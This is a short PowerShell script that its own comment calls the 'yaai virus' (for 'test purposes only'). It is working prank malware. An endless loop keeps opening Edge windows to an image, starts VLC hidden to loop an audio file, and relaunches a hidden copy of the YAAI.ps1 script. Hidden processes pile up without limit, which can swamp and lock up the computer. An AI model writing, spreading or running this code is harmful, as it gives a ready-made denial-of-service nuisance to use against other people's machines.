#yaai virus (test purposes only not for malicious purposes)
$active = $true
do {
    $user = $env:USERNAME
    $PC = $env:COMPUTERNAME
    Start-Process "msedge.exe" "--new-window https://tse1.mm.bing.net/th/id/OIP.S_PfIBoDsedg9WnK2IKeygHaEK?w=298&h=167&c=7&r=0&o=7&dpr=1.1&pid=1.7&rm=3" -WindowStyle Minimize
    Start-Process -FilePath "C:\Program Files\VideoLAN\VLC\vlc.exe" -ArgumentList "--loop `"C:\Users\$user\Desktop\ProcessManager\YAAI\YAAI.mp3`"" -WindowStyle Hidden
    Start-Process -FilePath "C:\Users\$user\Desktop\TheProject\modules\YAAI.ps1" -WindowStyle Hidden
} until ($active -eq $false)
